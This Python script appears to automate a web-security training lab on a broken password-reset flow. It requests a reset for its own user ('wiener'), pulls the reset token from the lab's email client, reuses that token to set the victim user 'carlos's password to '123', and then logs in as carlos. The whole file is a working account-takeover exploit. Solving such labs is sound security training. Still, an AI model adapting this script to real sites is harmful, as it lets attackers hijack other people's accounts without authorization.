import requests
from bs4 import BeautifulSoup

def get_email_client(LAB_URL):
    r = requests.get(LAB_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    email_client_url = soup.find("a", {"id": "exploit-link"})["href"]
    return email_client_url

def get_reset_password_url(email_client_url):
    r = requests.get(email_client_url)
    soup = BeautifulSoup(r.text, "html.parser")
    
    all_links = soup.find_all("a")
    reset_password_url = None
    for link in all_links:
        if "forgot-password" in link.text:
            reset_password_url = link["href"]
            break
    return reset_password_url

def ask_for_password_reset(LAB_URL) -> bool:
    r = requests.post(f"{LAB_URL}/forgot-password", data={"username": "wiener"})
    if "Please check your email for a reset password link." in r.text:
        return True
    return False

def reset_password(reset_password_url: str) -> None:
    body = {
        "temp-forgot-password-token": f"{reset_password_url.split('=')[1]}",
        "username": "carlos",
        "new-password-1": "123",
        "new-password-2": "123"
    }

    r = requests.post(reset_password_url, data=body)
    print("Carlos password reseted to 123")


LAB_URL = input("Enter the lab URL: ")
email_client_url = get_email_client(LAB_URL)
if ask_for_password_reset(LAB_URL):
    reset_password_url = get_reset_password_url(email_client_url)
    reset_password(reset_password_url)
    s = requests.Session()
    s.post(f"{LAB_URL}/login", data={"username": "carlos", "password": "123"})
    r = s.get(f"{LAB_URL}/my-account?id=carlos")
